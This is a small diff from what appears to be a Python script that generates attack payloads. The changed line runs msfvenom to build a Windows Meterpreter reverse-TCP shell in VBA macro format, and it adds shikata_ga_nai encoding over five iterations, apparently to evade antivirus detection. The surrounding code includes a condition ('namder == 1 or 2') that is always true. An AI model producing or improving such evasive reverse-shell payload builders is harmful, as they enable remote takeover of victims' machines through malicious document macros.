@@ -54,7 +54,7 @@ def windows(namder):
         port = int(input('lport: '))
 
         subprocess.call(
-            f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -f vba', shell=True)
+            f'msfvenom -p windows/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
 
 def linux(namder):
     if namder == 1 or 2:
